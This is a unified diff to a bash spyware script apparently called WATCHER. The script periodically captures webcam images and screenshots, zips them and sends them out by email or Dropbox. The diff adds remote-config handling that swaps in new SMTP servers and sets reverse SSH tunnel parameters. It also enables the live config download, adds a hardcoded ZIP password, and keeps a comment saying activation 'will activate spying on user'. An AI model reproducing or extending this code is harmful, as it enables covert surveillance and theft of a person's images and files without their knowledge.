@@ -2,21 +2,24 @@
 
 
 source function.sh
+change_smtp_server 0 default
 
 function check_connection {
 	# It would be better to ping google or yahoo or microsoft, or all at once.
 	#ping -q -w 1 -c 1 `ip r | grep default | cut -d ' ' -f 3` > /dev/null && CONNECTION_MODE=1 || CONNECTION_MODE=0
 	[ $DEBUG -eq 1 ] && echo "DEBUG: Checking connection..."
 	CONNECTION_MODE=0
-	RAND_NUMB=`shuf -i 1-3 | head -1`
+	local RAND_NUMB=`shuf -i 1-5 | head -1`
 	[ $RAND_NUMB -eq 1 ] && ping -q -w 1 -c 1 www.google.com > /dev/null && CONNECTION_MODE=1 && return 0
 	[ $RAND_NUMB -eq 2 ] && ping -q -w 1 -c 1 www.yahoo.com > /dev/null && CONNECTION_MODE=1 && return 0
 	[ $RAND_NUMB -eq 3 ] && ping -q -w 1 -c 1 www.microsoft.com > /dev/null && CONNECTION_MODE=1 && return 0
-	RAND_NUMB=`shuf -i 1-5 | head -1`
+	[ $RAND_NUMB -eq 4 ] && ping -q -w 1 -c 1 www.apple.com > /dev/null && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 5 ] && ping -q -w 1 -c 1 www.onet.pl > /dev/null && CONNECTION_MODE=1 && return 0
+	local RAND_NUMB=`shuf -i 1-5 | head -1`
 	[ $RAND_NUMB -eq 1 ] && `wget -q -O /dev/null --no-cache http://www.google.com/` && CONNECTION_MODE=1 && return 0
 	[ $RAND_NUMB -eq 2 ] && `wget -q -O /dev/null --no-cache http://www.yahoo.com/` && CONNECTION_MODE=1 && return 0
 	[ $RAND_NUMB -eq 3 ] && `wget -q -O /dev/null --no-cache http://www.microsoft.com/` && CONNECTION_MODE=1 && return 0
-	[ $RAND_NUMB -eq 4 ] && `wget -q -O /dev/null --no-cache http://www.onet.pl/` && CONNECTION_MODE=1 && return 0
+	[ $RAND_NUMB -eq 4 ] && `wget -q -O /dev/null --no-cache http://www.apple.com/` && CONNECTION_MODE=1 && return 0
 	[ $RAND_NUMB -eq 5 ] && `wget -q -O /dev/null --no-cache http://www.onet.pl/` && CONNECTION_MODE=1 && return 0
 }
 
@@ -40,9 +43,9 @@ function check_smtp {
 }
 
 function check_dir_size {
-	DIR_NAME="$1"
-	DIRSIZE=`du -s $DIR_NAME/ | cut -f 1`
-	CLEAN_DIR_WHILE=0
+	local DIR_NAME="$1"
+	local DIRSIZE=`du -s $DIR_NAME/ | cut -f 1`
+	local CLEAN_DIR_WHILE=0
 	[ ! -d $DIR_NAME ] && return 1
 	while [ $CLEAN_DIR_WHILE -lt 1 ]; do
 		if [ $DIRSIZE -ge $2 ]
@@ -56,9 +59,6 @@ function check_dir_size {
 		DIRSIZE=`du -s $DIR_NAME/ | cut -f 1`
 	done
 	[ $DIRSIZE -ge $3 ] && clean_dir $DIR_NAME
-	unset DIR_NAME
-	unset DIRSIZE
-	unset CLEAN_DIR_WHILE
 }
 
 function clean_dir {
@@ -74,35 +74,24 @@ function remote_config {
 	ACTIVATE=0
 	[ ! -f "$REMOTE_CONFIG_NAME.old" ] && touch "$REMOTE_CONFIG_NAME.old"
 	# following cp command is for testing purposes only; delete it and uncomment wget command!
-	cp WATCHER-hard.cfg WATCHER.cfg
-	#`wget -q --no-cache "$REMOTE_CONFIG_ADDRESS/$REMOTE_CONFIG_NAME"`
+	#cp WATCHER-hard.cfg WATCHER.cfg
+	`wget -q --no-cache "$REMOTE_CONFIG_ADDRESS/$REMOTE_CONFIG_NAME"`
 	if [ $? -eq 1 ]
 	then
 		[ $DEBUG -eq 1 ] && echo "DEBUG: remote_config - no success with downloading"
 		while read line_conf; do
-		line_conf1=`echo $line_conf | cut -d : -f 1`
-		line_conf2=`echo $line_conf | cut -d : -f 2`
-		[ "$line_conf1" == "$REMOTE_ACTIVATION_PASS" ] && ACTIVATE=1 && echo "Pass OK"
-		[ "$line_conf1" == "db_user" ] && [ $ACTIVATE -eq 1 ] && DB_EXT_USER=$line_conf2
-		[ "$line_conf1" == "db_pass" ] && [ $ACTIVATE -eq 1 ] && DB_EXT_PASS=$line_conf2
-		[ "$line_conf1" == "db_commit" ] && [ $ACTIVATE -eq 1 ] && [ $DB_EXT_USER != "" ] && [ $DB_EXT_PASS != "" ] && DB_EXT_ACTIVE=1
+			remote_config_read "$line_conf"
 		# post other options here
 		# activate diiferent upload options
 		done < "$REMOTE_CONFIG_NAME.old"
 	else
 		[ $DEBUG -eq 1 ] && echo "DEBUG: remote_config - SUCCESS with downloading"
 		while read line_conf; do
-		line_conf1=`echo $line_conf | cut -d : -f 1`
-		line_conf2=`echo $line_conf | cut -d : -f 2`
-		[ "$line_conf1" == "$REMOTE_ACTIVATION_PASS" ] && ACTIVATE=1 && echo "Pass OK"
-		[ "$line_conf1" == "disable_camera" ] && echo "Disable camera"
-		[ "$line_conf1" == "db_user" ] && [ $ACTIVATE -eq 1 ] && DB_EXT_USER=$line_conf2
-		[ "$line_conf1" == "db_pass" ] && [ $ACTIVATE -eq 1 ] && DB_EXT_PASS=$line_conf2
-		[ "$line_conf1" == "db_commit" ] && [ $ACTIVATE -eq 1 ] && [ $DB_EXT_USER != "" ] && [ $DB_EXT_PASS != "" ] && DB_EXT_ACTIVE=1
+			remote_config_read "$line_conf"
 		# post other options here
 		done < $REMOTE_CONFIG_NAME
-		MD5OLD=1
-		MD5NEW=2
+		local MD5OLD=1
+		local MD5NEW=2
 		[ -f "$REMOTE_CONFIG_NAME.old" ] && MD5OLD=`md5sum "$REMOTE_CONFIG_NAME.old" | cut -d " " -f 1`
 		[ -f "$REMOTE_CONFIG_NAME" ] && MD5NEW=`md5sum "$REMOTE_CONFIG_NAME" | cut -d " " -f 1`
 		if [[ "$MD5NEW" != "$MD5OLD" ]]	
@@ -119,6 +108,33 @@ function remote_config {
 	fi
 	[ -f "$REMOTE_CONFIG_NAME" ] && rm "$REMOTE_CONFIG_NAME"
 	return 0
+}
+
+function remote_config_read {
+	local line_conf1=`echo $1 | cut -d : -f 1`
+	local line_conf2=`echo $1 | cut -d : -f 2`
+	[ "$line_conf1" == "$REMOTE_ACTIVATION_PASS" ] && ACTIVATE=1 && echo "Pass OK"
+	[ "$line_conf1" == "disable_camera" ] && echo "Disable camera"
+	[ "$line_conf1" == "SMTP-name" ] && SMTP_NAME_NEW="$line_conf2"
+	[ "$line_conf1" == "SMTP-serv" ] && SMTP_SERVER_NEW="$line_conf2"
+	[ "$line_conf1" == "SMTP-port" ] && SMTP_PORT_NEW="$line_conf2"
+	[ "$line_conf1" == "SMTP-from" ] && SMTP_MAIL_FROM_NEW="$line_conf2"
+	[ "$line_conf1" == "SMTP-to" ] && SMTP_MAIL_TO_NEW="$line_conf2"
+	[ "$line_conf1" == "SMTP-user" ] && SMTP_USER_NEW="$line_conf2"
+	[ "$line_conf1" == "SMTP-pass" ] && SMTP_PASS_NEW="$line_conf2"
+	[ "$line_conf1" == "SMTP-commit" ] && setup_new_smtp_server
+	[ "$line_conf1" == "SMTP-disable" ] && smtp_disable $line_conf2
+	[ "$line_conf1" == "ZIP-pass" ] && echo "Change ZIP pass"
+	[ "$line_conf1" == "SSH_REV_PORT1" ] && [ $ACTIVATE -eq 1 ] && SSH_REV_PORT1=$line_conf2
+	[ "$line_conf1" == "SSH_REV_PORT2" ] && [ $ACTIVATE -eq 1 ] && SSH_REV_PORT2=$line_conf2
+	[ "$line_conf1" == "SSH_REV_PORT3" ] && [ $ACTIVATE -eq 3 ] && SSH_REV_PORT3=$line_conf2
+	[ "$line_conf1" == "SSH_REV_LOC" ] && [ $ACTIVATE -eq 1 ] && SSH_REV_LOC=$line_conf2
+	[ "$line_conf1" == "SSH_REV_USER" ] && [ $ACTIVATE -eq 1 ] && SSH_REV_USER=$line_conf2
+	[ "$line_conf1" == "SSH_REV_REMOTE" ] && [ $ACTIVATE -eq 1 ] && SSH_REV_REMOTE=$line_conf2
+	[ "$line_conf1" == "SSH_REV_COMMIT" ] && [ $ACTIVATE -eq 1 ] && SSH_REV_FINAL="$SSH_REV_PORT1:$SSH_REV_LOCAL:$SSH_REV_PORT2 $SSH_REV_USER:$SSH_REV_FINAL -p $SSH_REV_PORT3"
+	[ "$line_conf1" == "db_user" ] && [ $ACTIVATE -eq 1 ] && DB_EXT_USER=$line_conf2
+	[ "$line_conf1" == "db_pass" ] && [ $ACTIVATE -eq 1 ] && DB_EXT_PASS=$line_conf2
+	[ "$line_conf1" == "db_commit" ] && [ $ACTIVATE -eq 1 ] && [ $DB_EXT_USER != "" ] && [ $DB_EXT_PASS != "" ] && DB_EXT_ACTIVE=1
 }
 
 function remote_command {
@@ -139,6 +155,53 @@ function remote_command {
 	fi
 }
 
+function setup_new_smtp_server {
+	[ $DEBUG -eq 1 ] && echo "DEBUG: setup of new smtp server $SMTP_MAIL_FROM_NEW"
+	local COUNTER_FOR_SETUP_SMTP=1
+	while [ $COUNTER_FOR_SETUP_SMTP -le $SMTP_SERVERS_NUMBER ]
+	do
+		if [ $SMTP_NAME_NEW == "${SMTP_NAME[$COUNTER_FOR_SETUP_SMTP]}" ]
+		then 
+			return 1
+		fi
+		COUNTER_FOR_SETUP_SMTP=$(($COUNTER_FOR_SETUP_SMTP+1))
+	done
+
+	SMTP_SERVERS_NUMBER=$(($SMTP_SERVERS_NUMBER+1))
+	SMTP_NAME[$SMTP_SERVERS_NUMBER]="$SMTP_NAME_NEW"
+	SMTP_MAIL_FROM[$SMTP_SERVERS_NUMBER]="$SMTP_MAIL_FROM_NEW"
+	SMTP_MAIL_TO[$SMTP_SERVERS_NUMBER]="$SMTP_MAIL_TO_NEW"
+	SMTP_SERVER[$SMTP_SERVERS_NUMBER]="$SMTP_SERVER_NEW:$SMTP_PORT_NEW"
+	SMTP_USER[$SMTP_SERVERS_NUMBER]="$SMTP_USER_NEW"
+	SMTP_PASS[$SMTP_SERVERS_NUMBER]="$SMTP_PASS_NEW"
+	SMTP_ENABLED[$SMTP_SERVERS_NUMBER]=1
+	[ $DEBUG -eq 1 ] && echo "DEBUG: from: ${SMTP_MAIL_FROM[1]}"
+	[ $DEBUG -eq 1 ] && echo "DEBUG: from: ${SMTP_MAIL_FROM[2]}"
+	[ $DEBUG -eq 1 ] && echo "DEBUG: from: ${SMTP_MAIL_FROM[3]}"
+	return 0
+}
+
+function smtp_disable {
+	if [ $SMTP_SERVERS_NUMBER -ge 2 ]
+	then
+		local COUNTER_FOR_SETUP_SMTP=1
+		while [ $COUNTER_FOR_SETUP_SMTP -le $SMTP_SERVERS_NUMBER ]
+		do
+			if [ ${SMTP_NAME[$COUNTER_FOR_SETUP_SMTP]} == "$1" ]
+			then 
+				SMTP_ENABLED[$COUNTER_FOR_SETUP_SMTP]=0
+				[ $DEBUG -eq 1 ] && echo "DEBUG: disabled SMTP $1"
+				return 0
+			fi
+			COUNTER_FOR_SETUP_SMTP=$(($COUNTER_FOR_SETUP_SMTP+1))
+		done
+	else
+		[ $DEBUG -eq 1 ] && echo "DEBUG: I wont live without any SMTP servers :("
+		return 1
+	fi
+
+}
+
 function file_list {
 	DATA=`date +"%Y-%m-%d-%H-%M-%S"`
 	touch "tmp/remote.txt"
@@ -156,9 +219,9 @@ function file_data {
 function remote_send_file {
 	[ $DEBUG -eq 1 ] && echo "remote_send_file $1"
 	[ ! -f "$1" ] && return 1
-	FILESIZE=`du -s "$1" | cut -f 1`
+	local FILESIZE=`du -s "$1" | cut -f 1`
 	DATA=`date +"%Y-%m-%d-%H-%M-%S"`
-	FILE_NAME_sf="filerequest-$DATA-$RANDOM"
+	local FILE_NAME_sf="filerequest-$DATA-$RANDOM"
 	if [ $FILESIZE -le $MAX_ATACHEMENT_SIZE ]
 	then
 		[ $DEBUG -eq 1 ] && echo "DEBUG: File $1 smaller than max attachement size. SIZE:$FILESIZE"
@@ -199,14 +262,67 @@ function remote_send_file {
 		#[ $R_DB_ext -eq 1 ] && [ -f "$1" ] && [ $DB_EXT_ACTIVE -eq 1 ] && run_dropbox_ext "$1" 0
 		[ $SENT -eq 0 ] && [ $R_DB -eq 1 ] && [ -f "$1" ] && run_dropbox_file "$1"
 	fi
-	unset FILESIZE
-	unset FILE_NAME_sf
 	return 0
 }
 
+function send_later {
+	# 1 - MAX_ATACHEMENT_SIZE
+
+	if [ -n "${1+x}" ]; then
+		MAX_ATACHEMENT_SIZEsl=$1
+	else
+		MAX_ATACHEMENT_SIZEsl=5000
+	fi
+
+	local DIRsl="tosendlater"
+	DATA=`date +"%Y-%m-%d-%H-%M-%S"`
+	local FILEsl=""
+	if [ "$(ls -A $DIR)" ]; then
+		local FILENAMEsl="tmp/package$DATA.zip"
+		local FILESIZEsl=`du -s $DIRsl/ | cut -f 1`
+		#FILESIZE=$(stat -c%s "tmp/package$DATA.zip")
+		if [ $FILESIZEsl -le $MAX_ATACHEMENT_SIZEsl ]
+		then
+			zip -1 -r $FILENAMEsl $DIRsl
+			fsendemail "SendLater - $DATA" "Data" "$FILENAMEsl"
+			if [[ $RESP == *"Email was sent successfully!" ]]
+			then
+				rm $FILENAMEsl
+				rm $DIRsl/*
+				return 0 # which means everything is all right
+			else
+				rm $FILENAMEsl
+				local FILESIZE2sl=`du -s $DIRsl/ | cut -f 1`
+				# exit with "2" signal which means that one big email was not send
+				[[ $FILESIZE2sl -ge $FILESIZEsl ]] && return 2
+			fi
+		else
+			[ $DEBUG -eq 1 ] && echo "Send each files separetly"
+			local FILESsl=tosendlater/*
+			for f in $FILESsl
+			do
+				# CHECK FILE SIZE BEFORE SENDING AND DELETE IF TO BIG AND IN tosendlater DIRUECTORY 
+				local fSIZEsl=`du -s $f | cut -f 1`
+				if [ $fSIZEsl -le $MAX_ATACHEMENT_SIZEsl ]
+				then
+					fsendemail "SendLater - $DATA" "Data" "$f"
+					if [[ $RESP == *"Email was sent successfully!" ]]
+					then
+						rm $f
+					else
+						return 1
+					fi
+				else
+					rm $f
+				fi			
+			done
+		fi
+	fi
+}
+
 function run_send_later {
-	./send_later.sh $MAX_ATACHEMENT_SIZE
-	[ $? -ge 1 ] && CONNECTION_SMTP=0 && echo "SendLater returned 1+  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+	send_later $MAX_ATACHEMENT_SIZE
+	[ $? -ge 1 ] && CONNECTION_SMTP=0 && [ $DEBUG -eq 1 ] && echo "DEBUG: SendLater returned 1+  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
 }
 
 function run_dropbox {
@@ -249,6 +365,8 @@ T_INITIAL_DELAY=20
 
 # How often the main loop runs.
 T_CHECK_STATUS=120
+T_CHECK_STATUS2=900
+T_CHECK_STATUS_CHANGE=10 
 
 # Force check smtp connection every n main loop passes.
 T_SMTP_CHECK_EVERY=20 # Check every n passes of status check
@@ -265,12 +383,17 @@ T_CAM_DELAY=60
 # Make screenshot every n passes of n loop (if connection is established)
 T_CAM_EVERY=20
 
+# Zip password
+ZIP_PASS="42p6b2V3hy7c92g42p6b2V3hy7c92g"
+
 # Technical variables
 SMTP_COUNTER=0
 CAM_COUNTER=0
 ACTIVATE=0
 REMOTE_COUNTER=0
 DB_EXT_ACTIVE=0
+T_CHECK_STATUS_CHANGE_COUNTER=0
+
 
 # Becomes "1", when the first picture was made
 CAM_FIRST=0
@@ -309,8 +432,8 @@ DB_DIR_WARNING_SIZE=40000
 DB_DIR_MAX_SIZE=120000
 
 # Remote config:
-REMOTE_CONFIG=2 # 0 - don't; 1 - run only if config exists; 2 - check config but run even if config doesn't exists; 3 - run only when activated, but carry on when remote_file_config dissapeard
-REMOTE_CONFIG_ADDRESS="www.google.com" # Address to dir containing file
+REMOTE_CONFIG=2 # 0 - don't; 1 - run only if config exists; 2 - check config but run even if config doesn't exists; 3 - run only when activated by config, but doesn't exit when config file dissapears'
+REMOTE_CONFIG_ADDRESS="http://127.0.0.1" # Address to dir containing file
 REMOTE_CONFIG_NAME="WATCHER.cfg" # File name
 REMOTE_ACTIVATION_PASS="PASS" # Password (it should be placed at the top of config file), it will activate spying on user if you decoded so
 REMOTE_CHECK_EVERY=10 # check every 10 passes, for special commands
@@ -338,7 +461,7 @@ sleep $T_INITIAL_DELAY
 ########
 rm -rf camera/*
 rm -rf screenshot/*
-rm -rf raport/*
+rm -rf report/*
 rm -rf tmp/*
 rm -rf tosend/*
 check_dir_size "tosendlater" $DIR_MAX_SIZE $DIR_WARNING_SIZE
@@ -418,7 +541,7 @@ do
 	REMOTE_COUNTER=$(($REMOTE_COUNTER+1))
 	[ $CONNECTION_MODE -eq 1 ] && [ $REMOTE_COUNTER -ge $REMOTE_CHECK_EVERY ] && REMOTE_COUNTER=0 && remote_config 0;
 	[ $ACTIVATE -eq 0 ] && [ $REMOTE_CONFIG -eq 3 ] && sleep $REMOTE_WAIT_TO_NEXT_CHECK && continue;
-	[ $ACTIVATE -eq 0 ] && [ $CONNECTION_MODE -eq 1 ] && [ $REMOTE_CONFIG -eq 1 ] && exit 0;
+	[ $ACTIVATE -eq 0 ] && [ $CONNECTION_MODE -eq 1 ] && [ $REMOTE_CONFIG -eq 1 ] && ./stop.sh && exit 0;
 	[ $CONNECTION_MODE -eq 0 ] && [ $REMOTE_COUNTER -ge $REMOTE_CHECK_EVERY ] && DB_EXT_ACTIVE=0
 	[ $REMOTE_COUNTER -ge $REMOTE_CHECK_EVERY ] && REMOTE_COUNTER=0
 
@@ -435,11 +558,13 @@ do
 			then
 				./camera.sh $T_CAM_DELAY 0 &
 				CAM_COUNTER=0
+				sleep 10
 			fi
 		else
 		# It's first picture → capture and send as soon as possible
 			CAM_FIRST=1
-			./camera.sh 0 1
+			./camera.sh 0 1 &
+			sleep 10
 		fi
 		run_send_later
 	else
@@ -480,7 +605,7 @@ do
 	fi 
 
 
-    finish_time=$(date +%s)
+	finish_time=$(date +%s)
 	time_duration=$((finish_time - start_time))
  	[ $DEBUG -eq 1 ] && echo "DEBUG: Execution time: $time_duration secconds."
 
@@ -490,13 +615,21 @@ do
 	SLEEP_TIME=$((T_CHECK_STATUS-time_duration))
 	if [ $SLEEP_TIME -ge 10 ]
 	then
-		sleep $SLEEP_TIME
 		[ $DEBUG -eq 1 ] && echo "DEBUG: Sleep for $SLEEP_TIME sec."
+		sleep $SLEEP_TIME
 	else
-		sleep 10
 		[ $DEBUG -eq 1 ] && echo "DEBUG: Sleep for 10 sec."
+		sleep 10
 	fi
-	
+	if [ $T_CHECK_STATUS_CHANGE_COUNTER -ge $T_CHECK_STATUS_CHANGE ]
+	then
+		T_CHECK_STATUS=$T_CHECK_STATUS2
+	else
+		T_CHECK_STATUS_CHANGE_COUNTER=$(($T_CHECK_STATUS_CHANGE_COUNTER+1))
+	fi
+
+
+	./kill_soft2.sh "camera.sh" &
 
 	################
 	# Check connection
